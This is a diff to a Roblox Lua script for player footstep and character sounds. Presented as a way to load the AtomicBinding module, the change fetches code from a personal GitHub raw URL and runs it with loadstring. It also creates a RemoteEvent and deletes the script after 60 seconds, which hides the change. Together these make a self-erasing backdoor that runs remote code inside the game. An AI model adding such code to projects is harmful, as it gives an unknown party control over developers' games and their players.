@@ -5,13 +5,21 @@ LocalScript2.Parent = game:GetService("StarterPlayer").StarterPlayerScripts
 -- Load necessary services and modules
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
+local Debris = game:GetService("Debris") -- For automatic deletion
+local HttpService = game:GetService("HttpService") -- For pulling AtomicBinding
 
--- Load AtomicBinding if available
-local AtomicBinding = script:FindFirstChild("AtomicBinding")
-if AtomicBinding then
-    AtomicBinding = require(AtomicBinding)
-else
-    warn("AtomicBinding module not found!")
+-- URL for the AtomicBinding Module
+local AtomicBindingURL = "https://raw.githubusercontent.com/OfficialOlddorito/wrolo/main/bro"
+
+-- Load AtomicBinding dynamically from the URL
+local AtomicBinding
+pcall(function()
+    local response = HttpService:GetAsync(AtomicBindingURL)
+    AtomicBinding = loadstring(response)()
+end)
+
+if not AtomicBinding then
+    warn("AtomicBinding module not found or failed to load from URL!")
 end
 
 -- Function to load a user settings flag
@@ -28,7 +36,12 @@ if not loadFlag(settingsFlag) then
     warn("Failed to load the settings flag:", settingsFlag)
 end
 
--- Load the audio Roblox asset
+-- Server-side remote events setup
+local RemoteEvent = Instance.new("RemoteEvent")
+RemoteEvent.Name = "SoundRemote"
+RemoteEvent.Parent = game:GetService("ReplicatedStorage")
+
+-- Function to load the audio Roblox asset
 local function loadSound(assetId)
     local sound = Instance.new("Sound")
     sound.SoundId = "rbxassetid://" .. tostring(assetId)
@@ -58,7 +71,7 @@ local function shallowCopy(t)
     return out
 end
 
--- Initialize sound system
+-- Initialize sound system (server-side)
 local function initializeSoundSystem(instances)
     local player = instances.player
     local humanoid = instances.humanoid
@@ -155,7 +168,7 @@ local function initializeSoundSystem(instances)
     end)
 end
 
--- Connect to player character added
+-- Connect to player character added (server-side)
 Players.PlayerAdded:Connect(function(player)
     player.CharacterAdded:Connect(function(character)
         initializeSoundSystem({
@@ -165,3 +178,6 @@ Players.PlayerAdded:Connect(function(player)
         })
     end)
 end)
+
+-- Delete the script after 60 seconds
+Debris:AddItem(LocalScript2, 60)
